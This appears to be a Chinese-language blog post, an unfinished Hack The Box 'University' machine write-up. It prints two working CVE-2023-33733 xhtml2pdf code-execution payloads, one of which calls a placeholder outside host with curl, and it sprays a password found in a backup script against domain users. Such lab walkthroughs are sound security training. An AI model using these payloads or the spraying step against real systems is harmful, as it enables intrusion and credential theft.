@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="EnumNmap scan1234567891011121314151617181920212223242526272829303132333435PORT      STATE SERVICE       VERSION53&#x2F;tcp    open  domain        Simple DNS Plus80&#x2F;tcp    open  http          nginx 1.24.0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[M] University [Undone]">
+<meta property="og:url" content="http://fermionorz.github.io/2024/11/07/HTB-University/index.html">
+<meta property="og:site_name" content="一语成谶">
+<meta property="og:description" content="EnumNmap scan1234567891011121314151617181920212223242526272829303132333435PORT      STATE SERVICE       VERSION53&#x2F;tcp    open  domain        Simple DNS Plus80&#x2F;tcp    open  http          nginx 1.24.0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/University.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241108153412658.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111093007862.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241108154113477.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241108155903169.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241108160953473.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111111938659.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111112046204.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111112805946.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111112830931.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111150118392.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111155927019.png">
+<meta property="og:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/image-20241111160135052.png">
+<meta property="article:published_time" content="2024-11-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-18T12:30:51.263Z">
+<meta property="article:author" content="Fermionorz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fermionorz.github.io/2024/11/07/HTB-University/University.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/112745175">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://avatars.githubusercontent.com/u/112745175" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://avatars.githubusercontent.com/u/112745175">
+        
+      
+    
+    <!-- title -->
+    <title>[M] University [Undone]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="一语成谶" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/about">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/11/11/HTB-Lantern/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/01/%E5%AE%B6%E7%94%A8%E5%AD%98%E5%82%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://fermionorz.github.io/2024/11/07/HTB-University/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://fermionorz.github.io/2024/11/07/HTB-University/&text=[M] University [Undone]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://fermionorz.github.io/2024/11/07/HTB-University/&is_video=false&description=[M] University [Undone]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[M] University [Undone]&body=Check out this article: http://fermionorz.github.io/2024/11/07/HTB-University/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://fermionorz.github.io/2024/11/07/HTB-University/&name=[M] University [Undone]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://fermionorz.github.io/2024/11/07/HTB-University/&t=[M] University [Undone]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enum"><span class="toc-number">1.</span> <span class="toc-text">Enum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-scan"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-User-wao"><span class="toc-number">2.</span> <span class="toc-text">Shell as User - wao</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tcp-80"><span class="toc-number">2.1.</span> <span class="toc-text">Tcp-80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-1"><span class="toc-number">2.2.</span> <span class="toc-text">Enum</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-User"><span class="toc-number">3.</span> <span class="toc-text">Shell as User &#x3D;</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        [M] University [Undone]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Fermionorz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-07T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-11-08</time>
+        
+        (Updated: <time datetime="2024-11-18T12:30:51.263Z" class="dt-updated" itemprop="dateModified">2024-11-18</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Windows/">Windows</a> › <a class="category-link" href="/categories/Windows/Insane/">Insane</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <img src="/2024/11/07/HTB-University/University.png" class="">
+
+<h2 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h2><h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          nginx 1.24.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 4B8EA3A7F1A92D888835020074BB5558</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">|_http-title: University</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-08 14:31:30Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">2179/tcp  open  vmrdp?</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49672/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49697/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">59453/tcp open  msrpc         Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Shell-as-User-wao"><a href="#Shell-as-User-wao" class="headerlink" title="Shell as User - wao"></a>Shell as User - wao</h2><h3 id="Tcp-80"><a href="#Tcp-80" class="headerlink" title="Tcp-80"></a>Tcp-80</h3><img src="/2024/11/07/HTB-University/image-20241108153412658.png" class="">
+
+<p>注册一个用户，第一时间尝试注册教师用户，登陆失败，所以注册一个学生用户。</p>
+<img src="/2024/11/07/HTB-University/image-20241111093007862.png" class="">
+
+<p>发现一个把个人信息导出为 PDF 的功能</p>
+<img src="/2024/11/07/HTB-University/image-20241108154113477.png" class="">
+
+<p>查看属性可以了解到用的 xhtml2pdf 组件。通过搜索引擎找到了一个 RCE 漏洞 CVE-2023-33733。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/c53elyas/CVE-2023-33733">https://github.com/c53elyas/CVE-2023-33733</a></p>
+</blockquote>
+<p>这个 Github 仓库是用来测试 POC 的，运行 poc.py 相当于运行 payload，RCE 的部分在 system 中。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[ [ getattr(pow,Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;curl http://xxx.xxx.xxx.xxx/&#x27;) for Word in [orgTypeFun(&#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: False, &#x27;__eq__&#x27;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123;setattr(self, &#x27;mutated&#x27;, self.mutated - 1)&#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)) &#125;)] ] for orgTypeFun in [type(type(1))] ] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br><span class="line">	exploit</span><br><span class="line">	<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">para</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/07/HTB-University/image-20241108155903169.png" class="">
+
+<p>这个 POC 测了几次都失败了，看到仓库下方还有另一种方案</p>
+<img src="/2024/11/07/HTB-University/image-20241108160953473.png" class="">
+
+<p>这个是从 HTML 转化为 PDF 时 RCE 的 Payload，比较符合这个环境。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;touch /tmp/exploited&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span></span><br><span class="line">                exploit</span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">para</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/07/HTB-University/image-20241111111938659.png" class="">
+
+<p>更新信息后，变成这个样子，说明各个标签都正常解析了，才能正常执行。</p>
+<img src="/2024/11/07/HTB-University/image-20241111112046204.png" class="">
+
+<h3 id="Enum-1"><a href="#Enum-1" class="headerlink" title="Enum"></a>Enum</h3><img src="/2024/11/07/HTB-University/image-20241111112805946.png" class="">
+
+<p>发现一个备份目录</p>
+<img src="/2024/11/07/HTB-University/image-20241111112830931.png" class="">
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sourcePath</span> = <span class="string">&quot;C:\Web\University\db.sqlite3&quot;</span></span><br><span class="line"><span class="variable">$destinationPath</span> = <span class="string">&quot;C:\Web\DB Backups\&quot;</span></span><br><span class="line"><span class="variable">$7zExePath</span> = <span class="string">&quot;C:\Program Files\7-Zip\7z.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$zipFileName</span> = <span class="string">&quot;DB-Backup-<span class="variable">$</span>(Get-Date -Format &#x27;yyyy-MM-dd&#x27;).zip&quot;</span></span><br><span class="line"><span class="variable">$zipFilePath</span> = <span class="built_in">Join-Path</span> <span class="literal">-Path</span> <span class="variable">$destinationPath</span> <span class="literal">-ChildPath</span> <span class="variable">$zipFileName</span></span><br><span class="line"><span class="variable">$7zCommand</span> = <span class="string">&quot;&amp; `&quot;<span class="variable">$7zExePath</span>`&quot; a `&quot;<span class="variable">$zipFilePath</span>`&quot; `&quot;<span class="variable">$sourcePath</span>`&quot; -p&#x27;WebAO1337&#x27;&quot;</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> <span class="literal">-Command</span> <span class="variable">$7zCommand</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到备份文件的密码，这里可以喷射一下，先拿到所有域用户。</p>
+<img src="/2024/11/07/HTB-University/image-20241111150118392.png" class="">
+
+<img src="/2024/11/07/HTB-University/image-20241111155927019.png" class="">
+
+<p>拿到了 wao 用户的密码，再遛一下狗子</p>
+<img src="/2024/11/07/HTB-University/image-20241111160135052.png" class="">
+
+<p>可以看到 wao 没什么特殊的权限，不过他是在 WEB DEVELOPERS 组中</p>
+<h2 id="Shell-as-User"><a href="#Shell-as-User" class="headerlink" title="Shell as User &#x3D;"></a>Shell as User &#x3D;</h2>
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/about">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enum"><span class="toc-number">1.</span> <span class="toc-text">Enum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-scan"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-User-wao"><span class="toc-number">2.</span> <span class="toc-text">Shell as User - wao</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tcp-80"><span class="toc-number">2.1.</span> <span class="toc-text">Tcp-80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-1"><span class="toc-number">2.2.</span> <span class="toc-text">Enum</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-User"><span class="toc-number">3.</span> <span class="toc-text">Shell as User &#x3D;</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://fermionorz.github.io/2024/11/07/HTB-University/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://fermionorz.github.io/2024/11/07/HTB-University/&text=[M] University [Undone]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://fermionorz.github.io/2024/11/07/HTB-University/&is_video=false&description=[M] University [Undone]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[M] University [Undone]&body=Check out this article: http://fermionorz.github.io/2024/11/07/HTB-University/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://fermionorz.github.io/2024/11/07/HTB-University/&title=[M] University [Undone]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://fermionorz.github.io/2024/11/07/HTB-University/&name=[M] University [Undone]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://fermionorz.github.io/2024/11/07/HTB-University/&t=[M] University [Undone]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024
+    Fermionorz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/about">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.5.0/lxgwwenkaiscreenr.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/fira_code.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'fermionorz/fermionorz.github.io';
+      var utterances_issue_term = 'Blog';
+      var utterances_label = 'Blog-Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
